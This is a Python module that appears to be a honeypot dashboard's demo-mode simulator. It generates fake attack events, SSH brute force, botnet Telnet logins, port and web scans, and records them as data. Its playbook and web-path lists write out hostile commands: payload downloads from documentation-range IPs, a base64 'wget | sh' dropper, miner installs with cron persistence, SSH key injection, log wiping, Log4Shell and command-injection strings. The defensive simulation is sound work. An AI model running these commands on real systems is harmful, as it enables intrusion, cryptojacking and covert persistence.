"""Realistic synthetic attack traffic for demo mode.

Campaigns are modelled on behaviour commonly observed on internet-facing
honeypots: SSH brute force, Mirai-style Telnet credential stuffing from many
bots, port scans, web vulnerability scanners and post-login playbooks
(recon -> payload download -> persistence -> miner -> cleanup).

All simulated events are flagged `simulated=True` and never sent to Telegram.
IP addresses are randomly generated and do NOT refer to real attackers.
"""

from __future__ import annotations

import asyncio
import random
import time
from dataclasses import dataclass
from typing import Awaitable, Callable

from .models import Event, new_id

Ingest = Callable[..., Awaitable[object]]

# (city, country, country_code, lat, lon, weight)
ORIGINS = [
    ("Beijing", "China", "CN", 39.90, 116.40, 9), ("Shanghai", "China", "CN", 31.23, 121.47, 8),
    ("Shenzhen", "China", "CN", 22.54, 114.06, 6), ("Guangzhou", "China", "CN", 23.13, 113.26, 4),
    ("Ashburn", "United States", "US", 39.04, -77.49, 7), ("Dallas", "United States", "US", 32.78, -96.80, 4),
    ("Los Angeles", "United States", "US", 34.05, -118.24, 4), ("New York", "United States", "US", 40.71, -74.01, 3),
    ("Moscow", "Russia", "RU", 55.76, 37.62, 6), ("Saint Petersburg", "Russia", "RU", 59.93, 30.36, 3),
    ("São Paulo", "Brazil", "BR", -23.55, -46.63, 5), ("Hanoi", "Vietnam", "VN", 21.03, 105.85, 4),
    ("Ho Chi Minh City", "Vietnam", "VN", 10.82, 106.63, 4), ("Jakarta", "Indonesia", "ID", -6.21, 106.85, 4),
    ("Mumbai", "India", "IN", 19.08, 72.88, 4), ("Bangalore", "India", "IN", 12.97, 77.59, 3),
    ("Seoul", "South Korea", "KR", 37.57, 126.98, 4), ("Tehran", "Iran", "IR", 35.69, 51.39, 2),
    ("Amsterdam", "Netherlands", "NL", 52.37, 4.90, 4), ("Frankfurt", "Germany", "DE", 50.11, 8.68, 2),
    ("Bucharest", "Romania", "RO", 44.43, 26.10, 2), ("Kyiv", "Ukraine", "UA", 50.45, 30.52, 2),
    ("Istanbul", "Turkey", "TR", 41.01, 28.98, 2), ("Singapore", "Singapore", "SG", 1.35, 103.82, 4),
    ("Hong Kong", "Hong Kong", "HK", 22.32, 114.17, 4), ("Taipei", "Taiwan", "TW", 25.03, 121.57, 2),
    ("Tokyo", "Japan", "JP", 35.68, 139.69, 2), ("Bangkok", "Thailand", "TH", 13.76, 100.50, 2),
    ("Lagos", "Nigeria", "NG", 6.52, 3.38, 2), ("Cairo", "Egypt", "EG", 30.04, 31.24, 1),
    ("Johannesburg", "South Africa", "ZA", -26.20, 28.05, 1), ("Mexico City", "Mexico", "MX", 19.43, -99.13, 2),
    ("Bogotá", "Colombia", "CO", 4.71, -74.07, 1), ("Buenos Aires", "Argentina", "AR", -34.60, -58.38, 1),
    ("Paris", "France", "FR", 48.86, 2.35, 2), ("London", "United Kingdom", "GB", 51.51, -0.13, 2),
    ("Warsaw", "Poland", "PL", 52.23, 21.01, 1), ("Toronto", "Canada", "CA", 43.65, -79.38, 1),
    ("Karachi", "Pakistan", "PK", 24.86, 67.01, 1), ("Dhaka", "Bangladesh", "BD", 23.81, 90.41, 1),
]
NETWORK_TYPES = ["VPS / hosting provider", "Residential ISP", "Cloud provider", "Mobile carrier",
                 "Compromised IoT (residential)", "University network", "Bulletproof hosting"]

SSH_USERS = ["root"] * 8 + ["admin", "ubuntu", "user", "test", "oracle", "postgres", "pi", "git",
                            "ftpuser", "support", "guest", "deploy", "hadoop", "minecraft", "steam"]
PASSWORDS = ["123456", "password", "admin", "root", "12345678", "qwerty", "123123", "1q2w3e4r",
             "P@ssw0rd", "toor", "111111", "abc123", "letmein", "changeme", "raspberry", "ubuntu",
             "Passw0rd!", "admin123", "welcome1", "dragon", "master", "1234", "000000", "test123",
             "server", "Huawei@123", "default", "alpine", "zaq12wsx", "root123"]
MIRAI_CREDS = [("root", "xc3511"), ("root", "vizxv"), ("admin", "admin"), ("root", "888888"),
               ("root", "xmhdipc"), ("root", "default"), ("root", "juantech"), ("root", "54321"),
               ("support", "support"), ("root", "anko"), ("admin", "1234"), ("root", "7ujMko0admin")]
SCAN_PORTS = [21, 22, 23, 25, 80, 110, 443, 445, 1433, 2375, 3306, 3389, 5432, 5900, 6379,
              8080, 8443, 9200, 11211, 27017]
WEB_PATHS = [
    ("GET", "/.env"), ("GET", "/.git/config"), ("GET", "/wp-login.php"), ("POST", "/xmlrpc.php"),
    ("GET", "/phpmyadmin/index.php"), ("GET", "/admin/config.json"), ("GET", "/.aws/credentials"),
    ("GET", "/server-status"), ("GET", "/backup.sql"),
    ("GET", "/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id)"),
    ("GET", "/index.php?id=1' OR '1'='1"), ("GET", "/../../../../etc/passwd"),
    ("POST", "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"),
    ("GET", "/actuator/env"), ("POST", "/boaform/admin/formLogin"),
    ("GET", "/shell?cd+/tmp;wget+http://203.0.113.66/mozi.m;chmod+777+mozi.m;./mozi.m"),
    ("GET", "/?x=${jndi:ldap://198.51.100.23:1389/a}"), ("GET", "/"), ("GET", "/robots.txt"),
]
USER_AGENTS = ["Mozilla/5.0 zgrab/0.x", "python-requests/2.31.0", "curl/8.4.0", "Go-http-client/1.1",
               "Mozilla/5.0 (compatible; Nmap Scripting Engine)", "masscan/1.3",
               "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/119.0 Safari/537.36",
               "Hello, World", "Mozilla/5.0 (l9scan/2.0)"]

# Post-login playbooks. C2/payload hosts use RFC 5737 documentation ranges.
PLAYBOOKS = {
    "recon": [
        "uname -a", "whoami", "cat /proc/cpuinfo | grep name | wc -l", "free -m", "nproc",
        "cat /etc/os-release", "ps aux", "w",
    ],
    "miner": [
        "uname -a", "nproc", "cat /proc/cpuinfo | grep 'model name' | head -1",
        "cd /tmp", "wget -q http://203.0.113.47/xmrig.tar.gz -O .x.tgz",
        "tar xzf .x.tgz && chmod +x xmrig",
        "./xmrig -o stratum+tcp://pool.c3pool.example:13333 -u 4AdUnd... -B",
        "pkill -9 kdevtmpfsi; pkill -9 kinsing",
        "(crontab -l; echo '*/5 * * * * /tmp/xmrig -B') | crontab -",
        "history -c && unset HISTFILE",
    ],
    "botnet": [
        "cd /tmp || cd /var/run || cd /mnt",
        "wget http://198.51.100.88/bins/x86; curl -O http://198.51.100.88/bins/x86",
        "chmod 777 x86; ./x86 ssh.bot",
        "rm -rf x86",
        "rm -rf /var/log/auth.log",
    ],
    "persistence": [
        "id", "cat /etc/passwd", "cat /etc/shadow",
        "mkdir -p ~/.ssh && echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC9mdlr mdrfckr' >> ~/.ssh/authorized_keys",
        "chmod 600 ~/.ssh/authorized_keys",
        "echo 'root:N3wP@ss2024' | chpasswd",
        "useradd -m -s /bin/bash sysadm",
    ],
    "dropper_b64": [
        "echo d2dldCBodHRwOi8vMjAzLjAuMTEzLjEyL3Muc2ggLU8gLSB8IHNo | base64 -d | sh",
        "ifconfig", "netstat -tulpn", "cat /etc/resolv.conf",
    ],
}


@dataclass
class Attacker:
    ip: str
    city: str
    country: str
    country_code: str
    lat: float
    lon: float
    org: str


def _random_ip(rng: random.Random) -> str:
    while True:
        a = rng.randint(1, 223)
        if a in (10, 127, 169, 172, 192, 198, 203, 100, 0):
            continue
        return f"{a}.{rng.randint(0, 255)}.{rng.randint(0, 255)}.{rng.randint(1, 254)}"


class AttackSimulator:
    def __init__(self, ingest: Ingest, rate: float = 1.0, seed: int | None = None):
        self.ingest = ingest
        self.rate = max(0.1, rate)
        self.rng = random.Random(seed)
        self.pool: list[Attacker] = [self._new_attacker() for _ in range(160)]
        self.weights = [o[5] for o in ORIGINS]

    def _new_attacker(self) -> Attacker:
        city, country, cc, lat, lon, _ = self.rng.choices(ORIGINS, weights=[o[5] for o in ORIGINS])[0]
        return Attacker(
            ip=_random_ip(self.rng), city=city, country=country, country_code=cc,
            lat=lat + self.rng.uniform(-1.2, 1.2), lon=lon + self.rng.uniform(-1.2, 1.2),
            org=self.rng.choice(NETWORK_TYPES),
        )

    def _attacker(self) -> Attacker:
        if self.rng.random() < 0.15:
            a = self._new_attacker()
            self.pool[self.rng.randrange(len(self.pool))] = a
            return a
        return self.rng.choice(self.pool)

    def _event(self, a: Attacker, ts: float, **kw) -> Event:
        return Event(src_ip=a.ip, src_port=self.rng.randint(32768, 65535), ts=ts,
                     country=a.country, country_code=a.country_code, city=a.city,
                     lat=a.lat, lon=a.lon, org=a.org, simulated=True, **kw)

    # ------------------------------------------------------------ campaigns
    def campaign(self, start: float) -> list[Event]:
        kind = self.rng.choices(
            ["ssh_brute", "telnet_botnet", "port_scan", "web_scan", "ssh_quick_win", "noise"],
            weights=[34, 14, 14, 18, 8, 12],
        )[0]
        return getattr(self, f"_c_{kind}")(start)

    def _c_ssh_brute(self, t: float) -> list[Event]:
        a, sid = self._attacker(), new_id()
        evs = [self._event(a, t, sensor="ssh", event_type="connection", dst_port=22, session_id=sid)]
        user = self.rng.choice(SSH_USERS)
        n = self.rng.randint(6, 40)
        for _ in range(n):
            t += self.rng.uniform(0.6, 3.5)
            if self.rng.random() < 0.3:
                user = self.rng.choice(SSH_USERS)
            evs.append(self._event(a, t, sensor="ssh", event_type="login_failed", dst_port=22,
                                   session_id=sid, username=user, password=self.rng.choice(PASSWORDS)))
        if self.rng.random() < 0.22:
            evs += self._shell_session(a, t + 2, sid)
        return evs

    def _c_ssh_quick_win(self, t: float) -> list[Event]:
        a, sid = self._attacker(), new_id()
        evs = []
        for user, pw in self.rng.sample([("root", "admin"), ("root", "root"), ("admin", "admin"),
                                         ("root", "123456")], k=self.rng.randint(1, 3)):
            t += self.rng.uniform(0.5, 2)
            evs.append(self._event(a, t, sensor="ssh", event_type="login_failed", dst_port=22,
                                   session_id=sid, username=user, password=pw))
        return evs + self._shell_session(a, t + 1, sid)

    def _shell_session(self, a: Attacker, t: float, sid: str) -> list[Event]:
        user, pw = self.rng.choice([("root", "123456"), ("root", "root"), ("root", "password"),
                                    ("admin", "admin"), ("ubuntu", "ubuntu"), ("pi", "raspberry")])
        evs = [self._event(a, t, sensor="ssh", event_type="login_success", dst_port=22,
                           session_id=sid, username=user, password=pw)]
        book = self.rng.choices(list(PLAYBOOKS), weights=[30, 25, 20, 15, 10])[0]
        for cmd in PLAYBOOKS[book]:
            t += self.rng.uniform(0.4, 4.0)
            evs.append(self._event(a, t, sensor="ssh", event_type="command", dst_port=22,
                                   session_id=sid, username=user, command=cmd))
        return evs

    def _c_telnet_botnet(self, t: float) -> list[Event]:
        bots = [self._attacker() for _ in range(self.rng.randint(4, 9))]
        creds = self.rng.sample(MIRAI_CREDS, k=self.rng.randint(3, 6))
        evs = []
        for user, pw in creds:
            for b in bots:
                t += self.rng.uniform(0.1, 1.2)
                evs.append(self._event(b, t, sensor="telnet", event_type="login_failed", dst_port=23,
                                       session_id=new_id(), username=user, password=pw))
        return evs

    def _c_port_scan(self, t: float) -> list[Event]:
        a = self._attacker()
        evs = []
        for p in self.rng.sample(SCAN_PORTS, k=self.rng.randint(4, 14)):
            t += self.rng.uniform(0.05, 0.6)
            evs.append(self._event(a, t, sensor="tcp", event_type="port_probe", dst_port=p))
        return evs

    def _c_web_scan(self, t: float) -> list[Event]:
        a = self._attacker()
        ua = self.rng.choice(USER_AGENTS)
        evs = []
        for method, path in self.rng.sample(WEB_PATHS, k=self.rng.randint(2, 8)):
            t += self.rng.uniform(0.2, 2.0)
            evs.append(self._event(a, t, sensor="http", event_type="http_request", dst_port=80,
                                   http_method=method, path=path, user_agent=ua))
        if self.rng.random() < 0.35:
            for _ in range(self.rng.randint(2, 12)):
                t += self.rng.uniform(0.5, 2)
                evs.append(self._event(a, t, sensor="http", event_type="login_failed", dst_port=80,
                                       http_method="POST", path="/login", user_agent=ua,
                                       username=self.rng.choice(["admin", "administrator", "root", "user"]),
                                       password=self.rng.choice(PASSWORDS)))
        return evs

    def _c_noise(self, t: float) -> list[Event]:
        a = self._attacker()
        port = self.rng.choice([22, 23, 3389, 445, 5900])
        sensor = {22: "ssh", 23: "telnet"}.get(port, "tcp")
        et = "connection" if sensor in ("ssh", "telnet") else "port_probe"
        return [self._event(a, t, sensor=sensor, event_type=et, dst_port=port)]

    # ------------------------------------------------------------ drivers
    async def backfill(self, minutes: int) -> int:
        """Pre-populate history so the dashboard is alive the moment it opens."""
        now = time.time()
        events: list[Event] = []
        t = now - minutes * 60
        while t < now - 5:
            events += self.campaign(t)
            t += self.rng.expovariate(1 / 12.0)
        events = sorted((e for e in events if e.ts < now), key=lambda e: e.ts)
        for e in events:
            await self.ingest(e, broadcast=False)
        return len(events)

    async def run_forever(self) -> None:
        while True:
            events = self.campaign(time.time())
            start = events[0].ts if events else time.time()
            wall = time.time()
            for e in events:
                # replay the campaign at (accelerated) real-time speed
                delay = (e.ts - start) / (self.rate * 1.5) - (time.time() - wall)
                if delay > 0:
                    await asyncio.sleep(delay)
                e.ts = time.time()
                await self.ingest(e)
            await asyncio.sleep(self.rng.expovariate(self.rate / 2.5))
